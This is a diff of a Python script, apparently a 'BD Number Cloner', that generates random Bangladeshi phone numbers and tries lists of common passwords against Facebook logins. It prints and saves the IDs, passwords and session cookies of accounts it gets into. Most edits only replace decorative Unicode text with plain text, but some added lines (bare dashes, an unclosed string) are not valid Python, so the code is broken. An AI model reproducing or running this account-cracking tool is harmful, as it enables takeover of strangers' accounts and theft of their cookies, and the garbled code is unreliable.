@@ -201,7 +201,7 @@ def Main():
 
 	
 	
-	opt = input('𝐂𝐡𝐨𝐨𝐬𝐞 𝐨𝐩𝐭𝐢𝐨𝐧 \033[97;1m➠ ')
+	opt = input('Choose option\033[97;1m➠ ')
 	if opt =='1':
 		x()
 	if opt =='2':
@@ -213,17 +213,17 @@ def Main():
 	elif opt =='0':
 		exit()
 	else:
-		print('\n\033[1;92m𝐂𝐡𝐨𝐨𝐬𝐞 𝐯𝐚𝐥𝐢𝐝 𝐨𝐩𝐭𝐢𝐨𝐧\033[0;97m');time.sleep(1)
+		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
 		Main()
 def admin():
 	os.system('clear')
 	print(logo)
 	print(50*'_')
-	print(' [1] 𝐅𝐨𝐥𝐥𝐨𝐰 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐏𝐚𝐠𝐞')
-	print(' [0] 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐚𝐢𝐧 𝐦𝐞𝐧𝐮')
+	print(' [1] Follow Facebook Page')
+	print(' [0] Back To Main Menu')
 	
 	
-	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 𝐨𝐩𝐭𝐢𝐨𝐧>>> ')
+	bal = input('Choose Option>>> ')
 	if bal =='1':
 		os.system('xdg-open https://facebook.com/𝘼𝘾𝙏𝙄𝙊𝙉-𝙁𝙄𝙍𝙀-107968471946247');time.sleep(1)
 		admin()
@@ -236,10 +236,10 @@ def x():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 016, 017, 018, 019")
-	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
-	doamin = ' 𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐜𝐥𝐨𝐧𝐞𝐫 '
-	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
+	print(" Sim Code Example: 016, 017, 018, 019")
+	kode = input(' [★] Enter sim code: ')
+	doamin = ' BD Number Cloner '
+	limit = int(input('[?] How many numbers do you want to add: '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(8))
 		user.append(nmp)
@@ -250,7 +250,10 @@ def x():
 		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
 		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
 		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
-		
+	        ----------------------------------------------------------------
+		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
+		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE)
+		----------------------------------------------------------------      
 		for guru in user:
 			uid = kode+guru
 			ps1 = uid[6:]
@@ -259,18 +262,18 @@ def x():
 			pwx = [uid,ps1,ps2,ps3,'bangladesh','Bangladesh','free fire','Free Fire','i love you','freefire123']
 			yaari.submit(a,uid,pwx,tl)
 	print(50*'_')
-	print(' [•] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
-	print(' [•] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
+	print(' [•] Crack process has been completed')
+	print(' [•] Ids saved in ok.txt.cp.txt')
 	print(50*'_')
 	exit()
 def virus():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟎𝟏𝟔, 𝟎𝟏𝟕, 𝟎𝟏𝟖, 𝟎𝟏𝟗")
-	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
-	doamin = ' 𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐜𝐥𝐨𝐧𝐞𝐫 [𝐂𝐏-𝐎𝐊 𝐌𝐈𝐗] '
-	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
+	print(" Sim Code Example: 016, 017, 018, 019")
+	kode = input(' [★] Enter sim code: ')
+	doamin = ' BD Number Cloner [CP-OK MIX] '
+	limit = int(input('[?] How many numbers do you want to add : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
@@ -280,30 +283,31 @@ def virus():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' \033[97;1m[✓]  𝐓𝐨𝐭𝐚𝐥 𝐢𝐝𝐬:\033[1;92m '+tl)
-		print('\033[97;1m [✓]  𝐔𝐬𝐚𝐫𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
-		print(f'\033[97;1m [✓]\033[1;97m  𝐭𝐚𝐫𝐠𝐞𝐭 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞 :\033[1;92m {kode} ')
-		#print(f"\033[1;97m [✓]  𝐕𝐚𝐫𝐢𝐨𝐧:\033[1;92m {doamin}")
-		print(' \033[1;97m[✓]  𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
-		print(' [✓]  𝐔𝐬𝐞 𝐚𝐢𝐫𝐩𝐥𝐚𝐧𝐞 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬 ')
+		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
+		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
+		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
+		----------------------------------------------------------------
+		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
+		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE')
+		----------------------------------------------------------------
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','i love you','sexlover','112233']
 			yaari.submit(a,uid,pwx,tl)
 	print(50*'_')
-	print(' [•] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
-	print(' [•] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
+	print(' [•] Crack process has been completed')
+	print(' [•] Ids saved in ok.txt.cp.txt')
 	print(50*'_')
 	exit()
 def virus2():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟎𝟏𝟔, 𝟎𝟏𝟕, 𝟎𝟏𝟖, 𝟎𝟏𝟗")
-	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
-	doamin = ' 𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐜𝐥𝐨𝐧𝐞𝐫 \033[97;1m𝐎𝐍𝐋𝐘-𝐎𝐊 '
-	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
+	print(" Sim Code Example: 016, 017, 018, 019")
+	kode = input(' [★] Enter sim code: ')
+	doamin = ' BD Number Cloner \033[97;1mONLY-OK '
+	limit = int(input('[?]How many numbers do you want to add : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
@@ -313,30 +317,31 @@ def virus2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' \033[97;1m[✓]  𝐓𝐨𝐭𝐚𝐥 𝐢𝐝𝐬:\033[1;92m '+tl)
-		print('\033[97;1m [✓]  𝐔𝐬𝐚𝐫𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
-		print(f'\033[97;1m [✓]\033[1;97m  𝐭𝐚𝐫𝐠𝐞𝐭 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞 :\033[1;92m {kode} ')
-		#print(f"\033[1;97m [✓]  𝐕𝐚𝐫𝐢𝐨𝐧:\033[1;92m {doamin}")
-		print(' \033[1;97m[✓]  𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 ??𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
-		print(' [✓]  𝐔𝐬𝐞 𝐚𝐢𝐫𝐩𝐥??𝐧𝐞 𝐦??𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬 ')
+		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
+		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
+		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
+		----------------------------------------------------------------
+		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
+		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE')
+		----------------------------------------------------------------
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','i love you','sexlover']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [•] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
-	print(' [•] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
+	print(' [•] Crack process has been completed')
+	print(' [•] Ids saved in ok.txt.cp.txt')
 	print(50*'_')
 	exit()
 def virus3():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" 𝐒𝐢𝐦 𝐜𝐨𝐝𝐞 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 : 𝟎𝟏𝟔, 𝟎𝟏𝟕, 𝟎𝟏𝟖, 𝟎𝟏𝟗")
-	kode = input(' [★] 𝐄𝐧𝐭𝐞𝐫 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞: ')
-	doamin = ' 𝐁𝐃 𝐍𝐮𝐦𝐛𝐞𝐫 𝐜𝐥𝐨𝐧𝐞𝐫 \033[97;1m𝐀𝐏𝐊 '
-	limit = int(input('[?] 𝐇𝐨𝐰 𝐦𝐚𝐧𝐲 𝐧𝐮𝐦𝐛𝐞𝐫𝐬 𝐝𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐚𝐝𝐝 : '))
+	print(" Sim Code Example: 016, 017, 018, 019")
+	kode = input(' [★] Enter sim code: ')
+	doamin = ' BD Number Cloner \033[97;1mAPK '
+	limit = int(input('[?] How many numbers do you want to add : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
@@ -346,20 +351,21 @@ def virus3():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' \033[97;1m[✓]  𝐓𝐨𝐭𝐚𝐥 𝐢𝐝𝐬:\033[1;92m '+tl)
-		print('\033[97;1m [✓]  𝐔𝐬𝐚𝐫𝐚𝐠𝐞𝐧𝐭𝐬 : '+str(len(ugen)))
-		print(f'\033[97;1m [✓]\033[1;97m  𝐭𝐚𝐫𝐠𝐞𝐭 𝐬𝐢𝐦 𝐜𝐨𝐝𝐞 :\033[1;92m {kode} ')
-		#print(f"\033[1;97m [✓]  𝐕𝐚𝐫𝐢𝐨𝐧:\033[1;92m {doamin}")
-		print(' \033[1;97m[✓]  𝐓𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝')
-		print(' [✓]  𝐔𝐬𝐞 𝐚𝐢𝐫𝐩𝐥𝐚𝐧𝐞 𝐦𝐨𝐝𝐞 𝐢𝐟 𝐨𝐤 𝐢𝐝𝐬 ')
+		print('\033[1;35m[\033[1;32m✓] This massage is for my hatters')
+		print('\033[97;35m [\033[1;32m✓]      The FIRE Is Back')
+		print(f'\033[97;35m [\033[1;32m✓] Successfully Update Done 3:2.1')
+		----------------------------------------------------------------
+		print('\033[97;15m [\033[1;23m•\033[97;35m] Total ids:\033[1;92m '+tl)
+		print('\033[97;35m [\033[1;32m•\033[97;35m] SPEED BOOST (ON/OF) AIRPLANE MODE')
+		----------------------------------------------------------------
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','bangladesh','i love you','sexlover']
 			yaari.submit(c,uid,pwx,tl)
 	print(50*'_')
-	print(' [•] 𝐂𝐫𝐚𝐜𝐤 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝')
-	print(' [•] 𝐈𝐝𝐬 𝐬𝐚𝐯𝐞𝐝 𝐢𝐧 𝐨𝐤.𝐭𝐱𝐭,𝐜𝐩.𝐭𝐱𝐭')
+	print(' [•] Crack process has been completed')
+	print(' [•] Ids saved in ok.txt.cp.txt')
 	print(50*'_')
 	exit()
 def a(uid,pwx,tl):
@@ -370,7 +376,7 @@ def a(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93𝐅𝐈𝐑𝐄\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93 FIRE \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -407,26 +413,26 @@ def a(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [FIRE-OK] '+cid+' | '+ps+'\33[0;92m')
                 
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                 oks.append(cid)
                 
-                open('/sdcard/𝐅𝐈𝐑𝐄-𝗢𝗞 .𝐭𝐱𝐭', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/FIRE-OK .txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\33[1;91m[CP] {uid}|{ps}")
                 print(f'{W}CP-UA--> {pro}\n ')
-                open('/sdcard/𝐅𝐈𝐑𝐄-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/FIRE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[𝐅𝐈𝐑𝐄] \033[1;92m%s\033[m |\033[m[\033[m𝗢𝗞:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[ FIRE ] \033[1;92m%s\033[m |\033[m[\033[m𝗢𝗞:\033[1;92m%s\033[m] '%(loop,len(oks))),
        # sys.stdout.write(f" \r{R} [{B}SAHAN{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
@@ -439,7 +445,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐅𝐈𝐑𝐄\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m FIRE \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -476,11 +482,11 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [FIRE-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/𝐅𝐈𝐑𝐄-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/FIRE-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -495,7 +501,7 @@ def c(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐅𝐈𝐑𝐄\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m FIRE \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -532,12 +538,12 @@ def c(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [FIRE-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Numer : {uid}')
                 #print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/𝐅𝐈𝐑𝐄-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/FIRE-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 break
             else:
                 continue
